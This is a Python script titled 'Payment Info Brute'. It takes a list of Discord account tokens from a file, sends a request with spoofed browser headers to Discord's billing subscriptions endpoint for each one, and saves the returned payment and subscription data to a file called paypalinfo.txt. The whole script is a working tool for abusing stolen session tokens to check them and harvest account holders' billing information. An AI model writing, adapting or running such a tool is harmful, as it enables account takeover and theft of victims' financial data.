import requests
import colorama
import os, sys
import random
import threading
from colorama import Fore
colorama.init()

os.system('cls')
sys.stdout.write("\x1b]2;Payment Info Brute\x07")
os.system(f'mode con: cols=103 lines=25')

class bruteforce:

    def __init__ (self):

        self.amount = input(f'{Fore.RED}BRUTE{Fore.RESET} | How Many Tokens Do You Have? ')
        print('')
    
        def cycleaccounts(self):

            self.tokens = open('Data/tokens.txt', 'r').read().splitlines()
            self.token = random.choice(self.tokens)

    
        def getbillinginfo(self):

            for i in range(int(self.amount)):

                cycleaccounts(self)
                    
                headers = {
                    'authority': 'discord.com',
                    'accept': '*/*',
                    'accept-language': 'en-US,en;q=0.9',
                    'authorization': self.token,
                    'referer': 'https://discord.com/channels/@me',
                    'sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53',
                    'x-debug-options': 'bugReporterEnabled',
                    'x-discord-locale': 'en-US',
                    'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwNS4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMDUuMC4xMzQzLjUzIiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTA1LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiJodHRwczovL3d3dy5iaW5nLmNvbS8iLCJyZWZlcnJpbmdfZG9tYWluIjoid3d3LmJpbmcuY29tIiwic2VhcmNoX2VuZ2luZSI6ImJpbmciLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTUxMjQ5LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==',
                }

                params = {
                    'include_inactive': 'true',
                    #'limit': '2',
                }

                response = requests.get('https://discord.com/api/v9/users/@me/billing/subscriptions', params=params, headers=headers)
                self.paypal = (response.text)

                if response.status_code == 200:
                    print(F'{Fore.GREEN}luxify{Fore.RESET}: Got Valid Token | Token: {self.token}')
                    accountinfo = open('Data/paypalinfo.txt', 'a+')
                    accountinfo.write(f'{self.paypal}\n')
                
                if response.status_code == 401:
                    print(F'{Fore.RED}luxify{Fore.RESET}: Invalid Token | Status Code 401')
    
        getbillinginfo(self)

bruteforce()
